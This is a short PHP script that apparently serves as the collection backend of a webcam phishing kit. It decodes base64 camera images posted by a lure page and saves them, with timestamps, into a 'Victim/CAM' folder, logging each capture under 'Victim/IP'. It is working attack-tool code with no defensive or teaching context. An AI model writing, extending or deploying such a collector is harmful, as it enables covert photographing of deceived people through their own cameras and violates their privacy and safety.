<?php

date_default_timezone_set('Europe/Madrid');
$date = date('dMYHis');
$imageData = isset($_POST['cat']) ? $_POST['cat'] : '';

// Resolver ruta absoluta del proyecto (un nivel arriba de la carpeta `filter`)
$projectRoot = realpath(dirname(__DIR__));
$camDir = $projectRoot . DIRECTORY_SEPARATOR . 'Victim' . DIRECTORY_SEPARATOR . 'CAM';
$ipDir  = $projectRoot . DIRECTORY_SEPARATOR . 'Victim' . DIRECTORY_SEPARATOR . 'IP';
if (!is_dir($camDir)) {
    mkdir($camDir, 0777, true);
}
if (!is_dir($ipDir)) {
    mkdir($ipDir, 0777, true);
}

if (empty($imageData)) {
    http_response_code(400);
    error_log("post.php: no image data received - $date\n", 3, $ipDir . DIRECTORY_SEPARATOR . "log.txt");
    exit('no data');
}

$filteredData = substr($imageData, strpos($imageData, ",") + 1);
$unencodedData = base64_decode($filteredData);

$filename = 'DevCenterX-' . $date . '.png';
$fullPath = $camDir . DIRECTORY_SEPARATOR . $filename;

$written = file_put_contents($fullPath, $unencodedData);
if ($written === false) {
    // Registrar error detallado para depuración
    error_log("post.php: failed to write file: $fullPath - $date\n", 3, $ipDir . DIRECTORY_SEPARATOR . "log.txt");
    http_response_code(500);
    exit('error');
} else {
    // Registro simple de recibido
    error_log("Received $filename ($written bytes)\n", 3, $ipDir . DIRECTORY_SEPARATOR . "log.txt");
    http_response_code(200);
    exit('ok');
}
?>

